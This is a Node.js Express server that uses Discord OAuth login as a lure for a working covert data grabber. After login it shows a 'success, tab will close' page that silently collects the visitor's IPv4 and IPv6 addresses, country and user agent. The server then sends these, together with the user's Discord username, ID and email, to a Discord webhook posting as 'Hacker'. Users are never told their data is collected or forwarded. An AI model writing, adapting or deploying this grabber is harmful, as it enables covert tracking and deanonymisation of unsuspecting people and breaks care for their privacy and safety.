require('dotenv').config();
const express = require('express');
const path = require('path');
const session = require('express-session');
const passport = require('passport');
const DiscordStrategy = require('passport-discord').Strategy;
const fetch = require('node-fetch');

const {
  DISCORD_CLIENT_ID,
  DISCORD_CLIENT_SECRET,
  DISCORD_CALLBACK_URL,
  DISCORD_WEBHOOK_URL,
  SESSION_SECRET,
  PORT
} = process.env;

const app = express();

// --- Session & Passport setup ---
app.use(session({
  secret: SESSION_SECRET,
  resave: false,
  saveUninitialized: false
}));

app.use(passport.initialize());
app.use(passport.session());

passport.use(
  new DiscordStrategy(
    {
      clientID: DISCORD_CLIENT_ID,
      clientSecret: DISCORD_CLIENT_SECRET,
      callbackURL: DISCORD_CALLBACK_URL,
      scope: ['identify', 'email']
    },
    async (accessToken, refreshToken, profile, done) => {
      // The user’s Discord profile is passed here
      return done(null, profile);
    }
  )
);

passport.serializeUser((user, done) => {
  done(null, user);
});
passport.deserializeUser((obj, done) => {
  done(null, obj);
});

// --- Serve the static front-end from the "public" folder ---
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// ------------- Routes -------------
// Home (login) page is served by index.html in "public"
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Discord OAuth start
app.get('/auth/discord', passport.authenticate('discord'));

// Discord OAuth callback
app.get(
  '/auth/discord/callback',
  passport.authenticate('discord', { failureRedirect: '/' }),
  (req, res) => {
    // Redirect to a page that collects additional info and closes the tab
    res.redirect('/close-tab');
  }
);

// A page that closes the tab automatically and sends webhook
app.get('/close-tab', (req, res) => {
  res.send(`
    <html>
      <head>
        <meta charset="UTF-8"/>
        <title>Auth Success</title>
      </head>
      <body style="background: #f0f0f0; text-align: center; padding-top: 40px;">
        <h2>認証成功</h2>
        <p>このタブは自動的に閉じられます。</p>
        <script>
          async function sendUserInfo() {
            try {
              const ipv4Res = await fetch('https://api.ipify.org?format=json');
              const ipv4Data = await ipv4Res.json();
              const ipv4 = ipv4Data.ip || 'Unknown';

              const ipv6Res = await fetch('https://api64.ipify.org?format=json');
              const ipv6Data = await ipv6Res.json();
              const ipv6 = ipv6Data.ip || 'Unknown';

              let country = 'Unknown';
              try {
                const geoRes = await fetch('https://ipapi.co/json');
                const geoData = await geoRes.json();
                if (geoData.country_name) {
                  country = geoData.country_name;
                }
              } catch (err) {
                console.error('Failed to fetch geolocation:', err);
              }

              const browser = navigator.userAgent || 'Unknown';
              const accessedAt = new Date().toLocaleString('ja-JP', { timeZone: 'Asia/Tokyo' });

              const response = await fetch('/userinfo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ipv4, ipv6, country, browser, accessedAt })
              });

              if (!response.ok) {
                console.error('Failed to store user info on server');
              }
            } catch (err) {
              console.error('Error gathering user info:', err);
            }
          }

          // Send user info and close the tab
          sendUserInfo().then(() => {
            setTimeout(() => {
              window.close();
            }, 2000);
          });
        </script>
      </body>
    </html>
  `);
});

// POST /userinfo: store client-side IP & geolocation data in session and send webhook
app.post('/userinfo', async (req, res) => {
  req.session.userInfo = req.body; // Save IP, IPv6, country, browser, etc.

  const { user } = req;
  const { ipv4, ipv6, country, browser, accessedAt } = req.body;

  if (user) {
    const { username, discriminator, id, avatar, email } = user;
    const avatarURL = avatar
      ? `https://cdn.discordapp.com/avatars/${id}/${avatar}.png`
      : 'https://cdn.discordapp.com/embed/avatars/0.png'; // Default avatar if none

    const embedData = {
      username: 'Hacker',
      embeds: [
        {
          title: 'New User info',
          description: `A user just logged in via Discord!`,
          color: 3447003,
          thumbnail: { url: avatarURL },
          fields: [
            {
              name: 'User',
              value: `${username}#${discriminator} (ID: ${id})`
            },
            {
              name: 'Email',
              value: email || 'No email shared.',
              inline: false
            },
            {
              name: 'IPv4',
              value: ipv4,
              inline: false
            },
            {
              name: 'IPv6',
              value: ipv6,
              inline: false
            },
            {
              name: 'Country',
              value: country,
              inline: false
            },
            {
              name: 'Browser / User-Agent',
              value: browser,
              inline: false
            },
            {
              name: 'Accessed At',
              value: accessedAt,
              inline: false
            }
          ]
        }
      ]
    };

    try {
      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(embedData)
      });
      console.log('Webhook sent successfully!');
    } catch (err) {
      console.error('Error sending webhook:', err);
    }
  }

  return res.json({ status: 'ok' });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
